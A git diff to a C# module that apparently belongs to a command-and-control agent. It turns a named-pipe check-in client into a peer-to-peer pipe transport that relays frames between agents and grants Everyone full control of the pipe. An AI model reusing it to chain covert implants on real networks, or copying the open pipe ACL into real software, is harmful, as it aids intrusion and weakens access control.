@@ -11,35 +11,156 @@ using System.Threading;
 using System.Threading.Tasks;
 using Agent.Helpers;
 using System.Text;
+using BinarySerializer;
+using Shared;
+using System.Security.Principal;
+using System.Security.AccessControl;
 
 namespace Agent.Models
 {
-    public class PipeCommModule : Communicator
+    public class PipeCommModule : P2PCommunicator
     {
         public PipeCommModule(ConnexionUrl conn) : base(conn)
         {
+            if(conn.Protocol == ConnexionType.NamedPipe)
+            {
+                CommunicationMode = CommunicationModuleMode.Server;
+                return;
+            }
+            if(conn.Protocol == ConnexionType.ReverseNamedPipe)
+            {
+                CommunicationMode = CommunicationModuleMode.Client;
+                return;
+            }
+
+            throw new ArgumentException($"{conn.Protocol} is not a valid protocol.");
         }
 
+        private NamedPipeServerStream _pipeServer;
+        private NamedPipeClientStream _pipeClient;
 
-        protected override async Task<List<MessageTask>> CheckIn(List<MessageResult> results)
+        public override event Func<NetFrame, Task> FrameReceived;
+        public override event Action OnException;
+
+        public override void Init(Agent agent)
         {
-            var client = new NamedPipeClientStream(Connexion.Address, Connexion.PipeName, PipeAccessRights.FullControl, PipeOptions.Asynchronous, System.Security.Principal.TokenImpersonationLevel.Anonymous, HandleInheritability.None);
-            client.Connect(10000);
+            _tokenSource = new CancellationTokenSource();
 
-            client.SendMessage(this.Encryptor.Encrypt(results.Serialize()));
+            switch (this.CommunicationMode)
+            {
+                case CommunicationModuleMode.Server:
+                    {
+                        var ps = new PipeSecurity();
+                        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
+                            PipeAccessRights.FullControl, AccessControlType.Allow));
 
-            var responseContent = client.ReceivedMessage(true);
-            var dec = this.Encryptor.Decrypt(responseContent);
-            var tasks = dec.Deserialize<List<MessageTask>>();
+                        _pipeServer = new NamedPipeServerStream(this.Connexion.PipeName, PipeDirection.InOut,
+                            NamedPipeServerStream.MaxAllowedServerInstances,
+                            PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
 
-            var writer = new StreamWriter(client);
-            writer.WriteLine(); //Ack to end of transfert
-            writer.Flush();
+                        break;
+                    }
 
-            return tasks;
+                case CommunicationModuleMode.Client:
+                    {
+                        _pipeClient = new NamedPipeClientStream(this.Connexion.Address, this.Connexion.PipeName, PipeDirection.InOut,
+                            PipeOptions.Asynchronous);
+
+                        break;
+                    }
+
+                default:
+                    throw new ArgumentOutOfRangeException();
+            }
         }
 
+        public override async Task Start(object otoken)
+        {
+            switch (this.CommunicationMode)
+            {
+                case CommunicationModuleMode.Server:
+                    {
+                        _pipeServer.WaitForConnectionAsync().Wait();
+                        break;
+                    }
 
+                case CommunicationModuleMode.Client:
+                    {
+                        var timeout = new CancellationTokenSource(new TimeSpan(0, 0, 30));
+                        _pipeClient.ConnectAsync(timeout.Token).Wait();
+
+                        _pipeClient.ReadMode = PipeTransmissionMode.Byte;
+
+                        break;
+                    }
+
+                default:
+                    throw new ArgumentOutOfRangeException();
+            }
+
+            this.IsRunning = true;
+      
+            PipeStream pipeStream;
+            
+            switch(this.CommunicationMode)
+            {
+                case CommunicationModuleMode.Server:
+                    pipeStream = _pipeServer; break;
+                case CommunicationModuleMode.Client:
+                    pipeStream = _pipeClient; break;
+
+                default: throw new ArgumentOutOfRangeException();
+            };
+
+            while (!_tokenSource.IsCancellationRequested)
+            {
+                try
+                {
+                    if (pipeStream.DataAvailable())
+                    {
+                        var data = pipeStream.ReadStream().Result;
+                        var frame = data.BinaryDeserializeAsync<NetFrame>().Result;
+
+                        this.FrameReceived?.Invoke(frame);
+                    }
+                }
+                catch
+                {
+                    this.OnException?.Invoke();
+                    return;
+                }
+
+                Task.Delay(100).Wait();
+            }
+
+            _pipeServer?.Dispose();
+            _pipeClient?.Dispose();
+            _tokenSource.Dispose();
+        }
+
+        public override async Task SendFrame(NetFrame frame)
+        {
+            PipeStream pipeStream;
+            switch (this.CommunicationMode)
+            {
+                case CommunicationModuleMode.Server:
+                    pipeStream = _pipeServer; break;
+                case CommunicationModuleMode.Client:
+                    pipeStream = _pipeClient; break;
+
+                default: throw new ArgumentOutOfRangeException();
+            };
+           
+            try
+            {
+                var data = await frame.BinarySerializeAsync();
+                await pipeStream.WriteStream(data);
+            }
+            catch
+            {
+                OnException?.Invoke();
+            }
+        }
 
 
     }
